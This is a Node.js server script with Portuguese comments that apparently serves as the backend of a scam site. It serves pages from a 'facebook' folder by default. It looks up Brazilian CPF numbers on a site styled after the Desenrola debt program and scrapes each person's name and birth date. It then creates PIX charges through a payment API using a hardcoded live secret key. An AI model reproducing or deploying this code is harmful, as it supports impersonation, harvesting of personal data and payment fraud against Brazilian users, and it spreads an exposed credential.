const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');

const base = path.join(__dirname);
const mime = {
  'html':'text/html;charset=utf-8','css':'text/css','js':'application/javascript',
  'png':'image/png','jpg':'image/jpeg','jpeg':'image/jpeg','gif':'image/gif',
  'svg':'image/svg+xml','webp':'image/webp','ico':'image/x-icon',
  'mp3':'audio/mpeg','mp4':'video/mp4','mp3':'audio/mpeg','wav':'audio/wav'
};

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
};

// Lê body da requisição como Buffer
function readBodyBuffer(req) {
  return new Promise((resolve) => {
    const chunks = [];
    req.on('data', d => chunks.push(d));
    req.on('end', () => resolve(Buffer.concat(chunks)));
  });
}

// Requisição HTTPS genérica
function httpsReq(opts, body) {
  return new Promise((resolve, reject) => {
    const req = https.request(opts, res => {
      const chunks = [];
      res.on('data', d => chunks.push(d));
      res.on('end', () => resolve({
        status: res.statusCode,
        body: Buffer.concat(chunks),
        bodyStr: Buffer.concat(chunks).toString('utf8'),
        headers: res.headers
      }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

// Servir arquivo com suporte a Range (necessário para áudio/vídeo)
function serveFile(fp, req, res) {
  const stat = fs.statSync(fp);
  const ext = path.extname(fp).slice(1).toLowerCase();
  const ct = mime[ext] || 'application/octet-stream';
  const isHtml = ext === 'html';
  const extraHeaders = isHtml ? { 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Pragma': 'no-cache' } : {};
  const total = stat.size;
  const rangeHeader = req.headers['range'];

  if (rangeHeader) {
    // Parse Range: bytes=start-end
    const parts = rangeHeader.replace(/bytes=/, '').split('-');
    const start = parseInt(parts[0], 10);
    const end = parts[1] ? parseInt(parts[1], 10) : Math.min(start + 1024 * 1024, total - 1);
    const chunkSize = end - start + 1;

    res.writeHead(206, {
      ...CORS,
      'Content-Range': `bytes ${start}-${end}/${total}`,
      'Accept-Ranges': 'bytes',
      'Content-Length': chunkSize,
      'Content-Type': ct
    });
    fs.createReadStream(fp, { start, end }).pipe(res);
  } else {
    res.writeHead(200, {
      ...CORS,
      ...extraHeaders,
      'Content-Length': total,
      'Accept-Ranges': 'bytes',
      'Content-Type': ct
    });
    fs.createReadStream(fp).pipe(res);
  }
}

// Resolve caminho do arquivo, tentando /facebook/ como fallback
function resolvePath(pathname) {
  if (pathname === '/' || pathname === '') pathname = '/facebook/index.html';
  let fp = path.join(base, pathname);

  // Fallback: tentar com /facebook/ prefixo
  if (!fs.existsSync(fp) || (fs.statSync(fp).isDirectory() && !fs.existsSync(path.join(fp, 'index.html')))) {
    const fp2 = path.join(base, 'facebook', pathname);
    if (fs.existsSync(fp2)) fp = fp2;
  }
  if (fs.existsSync(fp) && fs.statSync(fp).isDirectory()) fp = path.join(fp, 'index.html');
  return fp;
}

http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = decodeURIComponent(parsed.pathname);

  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(200, CORS);
    return res.end();
  }

  // ── PROXY: api-cpf.php ──────────────────────────────────────────────────
  if (pathname.endsWith('api-cpf.php')) {
    const cpf = (parsed.query.cpf || '').replace(/\D/g, '');
    console.log('[CPF]', cpf);
    try {
      const bodyStr = JSON.stringify({ cpf });
      const checkRes = await httpsReq({
        hostname: 'consulta.desenrolasbr2026.com',
        path: '/api/check_cpf', method: 'POST',
        headers: {
          'Content-Type': 'application/json', 'Accept': 'application/json',
          'Referer': 'https://consulta.desenrolasbr2026.com/cpf',
          'Origin': 'https://consulta.desenrolasbr2026.com',
          'User-Agent': 'Mozilla/5.0', 'Content-Length': Buffer.byteLength(bodyStr)
        }
      }, bodyStr);

      const checkJson = JSON.parse(checkRes.bodyStr);
      if (!checkJson.success) {
        res.writeHead(200, { 'Content-Type': 'application/json', ...CORS });
        return res.end(JSON.stringify({ nome: '', nascimento: '' }));
      }

      const cookie = (checkRes.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');
      const atenRes = await httpsReq({
        hostname: 'consulta.desenrolasbr2026.com',
        path: '/atendimento?cpf=' + cpf, method: 'GET',
        headers: { 'Cookie': cookie, 'Referer': 'https://consulta.desenrolasbr2026.com/cpf', 'User-Agent': 'Mozilla/5.0' }
      });

      const nomeMatch = atenRes.bodyStr.match(/const NOME\s*=\s*"([^"]+)"/);
      const nascMatch = atenRes.bodyStr.match(/const NASC\s*=\s*"([^"]+)"/);
      const nome = nomeMatch ? nomeMatch[1] : '';
      const nasc = nascMatch ? nascMatch[1] : '';
      console.log('[CPF] Nome:', nome);

      res.writeHead(200, { 'Content-Type': 'application/json', ...CORS });
      res.end(JSON.stringify({ nome, nascimento: nasc, success: true }));
    } catch(e) {
      console.error('[CPF] Erro:', e.message);
      res.writeHead(200, { 'Content-Type': 'application/json', ...CORS });
      res.end(JSON.stringify({ nome: '', nascimento: '' }));
    }
    return;
  }

  const BLACKCAT_SK = 'sk_live_2869f98ba05e8789e923dcc8a1784be7d3adca5d45a09ed01bcf5dcef046d0b8';

  // ── PROXY: BlackCat - Criar PIX ─────────────────────────────────────────
  if (pathname === '/proxy/blackcat/create') {
    const rawBody = await readBodyBuffer(req);
    console.log('[BLACKCAT] Payload recebido:', rawBody.toString().substring(0, 200));
    try {
      const inp = JSON.parse(rawBody.toString('utf8'));

      // Transforma o payload do frontend para o formato da BlackCat API
      const amount   = inp.payment_amount || 6892;
      const nomePix  = (inp.customer && inp.customer.name)     || 'Cliente';
      const email    = (inp.customer && inp.customer.email)    || 'cliente@gmail.com';
      const phone    = ((inp.customer && inp.customer.phone)   || '11999999999').replace(/\D/g, '');
      const cpfNum   = ((inp.customer && inp.customer.document)|| '00000000000').replace(/\D/g, '');
      const extCode  = inp.external_code || ('DR-' + Date.now());
      const prodName = (inp.items && inp.items[0] && inp.items[0].name) || 'Pagamento Seguro';

      const payload = JSON.stringify({
        amount:        amount,
        currency:      'BRL',
        paymentMethod: 'pix',
        items:         [{ title: prodName, quantity: 1, tangible: false }],
        customer: {
          name:     nomePix,
          email:    email,
          phone:    phone,
          document: { number: cpfNum, type: 'cpf' }
        },
        pix:         { expiresInDays: 1 },
        externalRef: extCode
      });

      const payloadBuf = Buffer.from(payload, 'utf8');
      console.log('[BLACKCAT] Enviando para API:', payload.substring(0, 200));

      const r = await httpsReq({
        hostname: 'api.blackcatoficial.com',
        path: '/api/sales/create-sale',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': BLACKCAT_SK,
          'Accept': 'application/json',
          'Content-Length': payloadBuf.length
        }
      }, payloadBuf);

      console.log('[BLACKCAT] Status:', r.status, r.bodyStr.substring(0, 300));
      res.writeHead(r.status, { 'Content-Type': 'application/json', ...CORS });
      res.end(r.body);
    } catch(e) {
      console.error('[BLACKCAT] Erro:', e.message);
      res.writeHead(500, { 'Content-Type': 'application/json', ...CORS });
      res.end(JSON.stringify({ success: false, error: e.message }));
    }
    return;
  }

  // ── PROXY: BlackCat - Status da transação ──────────────────────────────
  if (pathname.startsWith('/proxy/blackcat/status/')) {
    const transactionId = pathname.replace('/proxy/blackcat/status/', '');
    console.log('[BLACKCAT] Status de:', transactionId);
    try {
      const r = await httpsReq({
        hostname: 'api.blackcatoficial.com',
        path: `/api/sales/${transactionId}/status`,
        method: 'GET',
        headers: {
          'X-API-Key': BLACKCAT_SK,
          'Accept': 'application/json'
        }
      });
      console.log('[BLACKCAT] Status resp:', r.status, r.bodyStr.substring(0, 200));
      res.writeHead(r.status, { 'Content-Type': 'application/json', ...CORS });
      res.end(r.body);
    } catch(e) {
      res.writeHead(500, { 'Content-Type': 'application/json', ...CORS });
      res.end(JSON.stringify({ success: false, error: e.message }));
    }
    return;
  }

  // ── ARQUIVOS ESTÁTICOS (com Range support) ─────────────────────────────
  const fp = resolvePath(pathname);
  if (!fs.existsSync(fp)) {
    console.log('[404]', pathname);
    res.writeHead(404);
    return res.end('404: ' + pathname);
  }
  serveFile(fp, req, res);

}).listen(process.env.PORT || 8080, () => console.log('Servidor rodando em http://localhost:' + (process.env.PORT || 8080)));
